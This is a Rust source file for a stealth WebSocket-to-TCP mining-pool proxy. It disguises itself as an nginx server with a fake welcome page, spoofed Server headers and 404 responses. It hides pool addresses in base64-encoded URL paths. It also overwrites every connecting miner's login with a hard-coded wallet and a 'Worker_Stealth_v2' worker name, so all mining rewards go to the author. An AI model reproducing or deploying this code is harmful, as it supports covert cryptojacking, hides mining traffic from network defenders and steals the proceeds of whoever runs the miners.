use axum::{
    extract::{Path, WebSocketUpgrade, ws::{Message, WebSocket}, Request},
    response::{Html, Response, IntoResponse},
    http::{StatusCode, HeaderValue, header::{SERVER, DATE, CONNECTION, CONTENT_TYPE, UPGRADE, SEC_WEBSOCKET_ACCEPT}},
    routing::get,
    Router,
    middleware::{self, Next},
};
use std::{sync::{Arc, atomic::{AtomicUsize, Ordering}}, net::SocketAddr};
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use futures_util::{StreamExt, SinkExt};
use serde_json::Value;
use base64::{Engine as _, engine::general_purpose};
use colored::*;
use chrono::Utc;

// ==========================================
// ⚙️ CẤU HÌNH
// ==========================================
const LISTEN_ADDR: &str = "0.0.0.0:8080";
const MY_WALLET: &str = "SC1siHCYzSU3BiFAqYg3Ew5PnQ2rDSR7QiBMiaKCNQqdP54hx1UJLNnFJpQc1pC3QmNe9ro7EEbaxSs6ixFHduqdMkXk7MW71ih.003";
const MY_WORKER: &str = "Worker_Stealth_v2";

const NGINX_WELCOME: &str = r#"<!DOCTYPE html>
<html>
<head><title>Welcome to nginx!</title></head>
<body><h1>Welcome to nginx!</h1></body>
</html>"#;

struct ProxyStats {
    shares_sent: AtomicUsize,
    shares_accepted: AtomicUsize,
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt().with_max_level(tracing::Level::INFO).init();

    let app = Router::new()
        .route("/", get(root_handler))
        .route("/:path", get(stealth_handler))
        .layer(middleware::from_fn(nginx_spoofer));

    let addr: SocketAddr = LISTEN_ADDR.parse().expect("Invalid IP");
    println!("{} {}", "🚀 PROXY V2 RUNNING ON".green().bold(), addr);
    
    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}

// ==========================================
// 🛡️ MIDDLEWARE FIX (QUAN TRỌNG)
// ==========================================
async fn nginx_spoofer(req: Request, next: Next) -> Response {
    let mut response = next.run(req).await;
    let headers = response.headers_mut();

    // 1. Luôn giả mạo Server
    headers.insert(SERVER, HeaderValue::from_static("nginx/1.18.0 (Ubuntu)"));
    
    // 2. Thêm Date
    let now = Utc::now().format("%a, %d %b %Y %H:%M:%S GMT").to_string();
    if let Ok(val) = HeaderValue::from_str(&now) {
        headers.insert(DATE, val);
    }

    // 3. FIX LỖI 502: Tuyệt đối KHÔNG đụng vào Connection header nếu là WebSocket (Status 101)
    if response.status() != StatusCode::SWITCHING_PROTOCOLS {
        headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));
    }
    
    response
}

async fn root_handler() -> Html<&'static str> {
    Html(NGINX_WELCOME)
}

async fn stealth_handler(
    Path(path): Path<String>, 
    ws: Option<WebSocketUpgrade>
) -> Response {
    // Decode Base64
    let decoded_vec = if let Ok(d) = general_purpose::STANDARD.decode(&path) { d }
    else if let Ok(d) = general_purpose::URL_SAFE_NO_PAD.decode(&path) { d }
    else { return not_found_response() };

    let pool_addr = match String::from_utf8(decoded_vec) {
        Ok(s) => if s.contains(':') { s } else { return not_found_response() },
        Err(_) => return not_found_response(),
    };

    match ws {
        Some(w) => {
            println!("{} Tunnel -> {}", "🥷".magenta(), pool_addr);
            w.on_upgrade(move |socket| mining_tunnel(socket, pool_addr))
        },
        None => not_found_response()
    }
}

fn not_found_response() -> Response {
    (StatusCode::NOT_FOUND, Html("404 Not Found")).into_response()
}

// ==========================================
// MINING CORE (THÊM LOG LỖI)
// ==========================================
async fn mining_tunnel(mut socket: WebSocket, pool_addr: String) {
    // Thêm Timeout cho kết nối TCP (10 giây)
    let tcp_connect = tokio::time::timeout(
        std::time::Duration::from_secs(10), 
        TcpStream::connect(&pool_addr)
    ).await;

    let tcp_stream = match tcp_connect {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => {
            println!("{} Pool Connection Failed (IO): {}", "❌".red(), e);
            return; 
        },
        Err(_) => {
            println!("{} Pool Connection Timeout", "❌".red());
            return;
        }
    };

    println!("{} Connected to Pool Successfully", "✅".green());

    let (mut pool_read, mut pool_write) = tcp_stream.into_split();
    let (mut ws_write, mut ws_read) = socket.split();
    
    let stats = Arc::new(ProxyStats { shares_sent: AtomicUsize::new(0), shares_accepted: AtomicUsize::new(0) });

    // Miner -> Pool
    let _stats_m = stats.clone();
    let c2s = tokio::spawn(async move {
        while let Some(Ok(msg)) = ws_read.next().await {
            if let Message::Text(text) = msg {
                for line in text.lines() {
                    if line.trim().is_empty() { continue; }
                    let mut final_msg = line.to_string();
                    
                    if let Ok(mut json) = serde_json::from_str::<Value>(line) {
                        if json["method"] == "login" {
                            json["params"]["login"] = serde_json::json!(MY_WALLET);
                            json["params"]["pass"] = serde_json::json!(MY_WORKER);
                            final_msg = json.to_string();
                        }
                    }
                    if !final_msg.ends_with('\n') { final_msg.push('\n'); }
                    if pool_write.write_all(final_msg.as_bytes()).await.is_err() { return; }
                }
            }
        }
    });

    // Pool -> Miner
    let _stats_p = stats.clone();
    let s2c = tokio::spawn(async move {
        let mut buffer = [0u8; 8192];
        loop {
            match pool_read.read(&mut buffer).await {
                Ok(0) => break,
                Ok(n) => {
                    let text = String::from_utf8_lossy(&buffer[0..n]);
                    if ws_write.send(Message::Text(text.to_string())).await.is_err() { break; }
                }
                Err(_) => break,
            }
        }
    });

    let _ = tokio::select! { _ = c2s => {}, _ = s2c => {} };
}
